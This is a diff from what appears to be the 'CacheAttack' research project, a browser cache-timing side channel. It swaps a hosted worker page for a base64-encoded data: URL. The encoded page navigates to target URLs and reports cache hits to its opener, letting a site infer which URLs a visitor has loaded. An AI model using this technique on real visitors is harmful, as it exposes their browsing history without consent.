@@ -2,7 +2,7 @@
 
 // NDev 2020 https://github.com/NDevTK/CacheAttack
 const firefox = navigator.userAgent.includes("Firefox");
-const window = "data:text/html;charset=utf-8;base64,PHRpdGxlPkNhY2hlQXR0YWNrIFdvcmtlcjwvdGl0bGU+DQo8aDE+Q2FjaGVBdHRhY2sgV29ya2VyPC9oMT4NCjxwMT5UaGlzIHdpbmRvdyBpcyB1c2VkIGZvciBjYWNoZSBjaGVja2luZy48L3AxPg0KPHNjcmlwdCBzcmM9Imh0dHBzOi8vbmRldi50ay9taXJyb3IvSGFja1RpbWVyL0hhY2tUaW1lci5taW4uanMiPjwvc2NyaXB0Pg0KPHNjcmlwdD4NCm1heCA9IChuYXZpZ2F0b3IudXNlckFnZW50LmluY2x1ZGVzKCJGaXJlZm94IikpID8gMTAgOiAzMDsNCmNhY2hlZCA9IHRydWU7DQoNCndpbmRvdy5hZGRFdmVudExpc3RlbmVyKCJtZXNzYWdlIiwgZnVuY3Rpb24oZXZlbnQpIHsgIA0KICBpZighZXZlbnQuZGF0YS5zdGFydHNXaXRoKCJodHRwczovLyIpIHx8IGV2ZW50Lm9yaWdpbiAhPT0gImh0dHBzOi8vY2FjaGUubmRldi50ayIpIHJldHVybg0KICBzZXRUaW1lb3V0KF8gPT4gew0KICAgIGNhY2hlZCA9IGZhbHNlOw0KICAgIHdpbmRvdy5sb2NhdGlvbi5yZWxvYWQoKTsNCiAgfSwgbWF4KTsNCiAgd2luZG93LmxvY2F0aW9uID0gZXZlbnQuZGF0YTsNCn0pOw0KICANCndpbmRvdy5hZGRFdmVudExpc3RlbmVyKCJwYWdlaGlkZSIsIGV2ZW50ID0+IHsNCiAgd2luZG93Lm9wZW5lci5wb3N0TWVzc2FnZShjYWNoZWQpOw0KfSk7DQogIA0Kd2luZG93LmFkZEV2ZW50TGlzdGVuZXIoJ2xvYWQnLCAoZXZlbnQpID0+IHsNCiAgd2luZG93Lm9wZW5lci5wb3N0TWVzc2FnZSgibG9hZCIpOw0KfSk7DQo8L3NjcmlwdD4=";
+const redirect = "data:text/html;charset=utf-8;base64,PHRpdGxlPkNhY2hlQXR0YWNrIFdvcmtlcjwvdGl0bGU+DQo8aDE+Q2FjaGVBdHRhY2sgV29ya2VyPC9oMT4NCjxwMT5UaGlzIHdpbmRvdyBpcyB1c2VkIGZvciBjYWNoZSBjaGVja2luZy48L3AxPg0KPHNjcmlwdCBzcmM9Imh0dHBzOi8vbmRldi50ay9taXJyb3IvSGFja1RpbWVyL0hhY2tUaW1lci5taW4uanMiPjwvc2NyaXB0Pg0KPHNjcmlwdD4NCm1heCA9IChuYXZpZ2F0b3IudXNlckFnZW50LmluY2x1ZGVzKCJGaXJlZm94IikpID8gMTAgOiAzMDsNCmNhY2hlZCA9IHRydWU7DQoNCndpbmRvdy5hZGRFdmVudExpc3RlbmVyKCJtZXNzYWdlIiwgZnVuY3Rpb24oZXZlbnQpIHsgIA0KICBpZighZXZlbnQuZGF0YS5zdGFydHNXaXRoKCJodHRwczovLyIpIHx8IGV2ZW50Lm9yaWdpbiAhPT0gImh0dHBzOi8vY2FjaGUubmRldi50ayIpIHJldHVybg0KICBzZXRUaW1lb3V0KF8gPT4gew0KICAgIGNhY2hlZCA9IGZhbHNlOw0KICAgIHdpbmRvdy5sb2NhdGlvbi5yZWxvYWQoKTsNCiAgfSwgbWF4KTsNCiAgd2luZG93LmxvY2F0aW9uID0gZXZlbnQuZGF0YTsNCn0pOw0KICANCndpbmRvdy5hZGRFdmVudExpc3RlbmVyKCJwYWdlaGlkZSIsIGV2ZW50ID0+IHsNCiAgd2luZG93Lm9wZW5lci5wb3N0TWVzc2FnZShjYWNoZWQpOw0KfSk7DQogIA0Kd2luZG93LmFkZEV2ZW50TGlzdGVuZXIoJ2xvYWQnLCAoZXZlbnQpID0+IHsNCiAgd2luZG93Lm9wZW5lci5wb3N0TWVzc2FnZSgibG9hZCIpOw0KfSk7DQo8L3NjcmlwdD4=";
 const max = 10.5;
 
 if (self.document === undefined) {
@@ -138,7 +138,7 @@ function WindowEvent(check = false) {
 }
 
 function initChecker() {
-    checker = open(window);
+    checker = open(redirect);
 }
 
 // Currently fails if not in loop
@@ -160,14 +160,14 @@ async function block(url) {
     for (;;) {
         if (checker.closed) location.reload();
         checker.postMessage(url[0]);
-        checker.location = "https://cache.ndev.tk/window.html";
+        checker.location = redirect;
         await WindowEvent();
     }
 }
 
 function blockerFrame(url) {
     if (document.getElementById("ifrm")) {
-        ifrm.src = "https://cache.ndev.tk/window.html";
+        ifrm.src = redirect;
         return;
     }
     var ifrm = document.createElement("iframe");
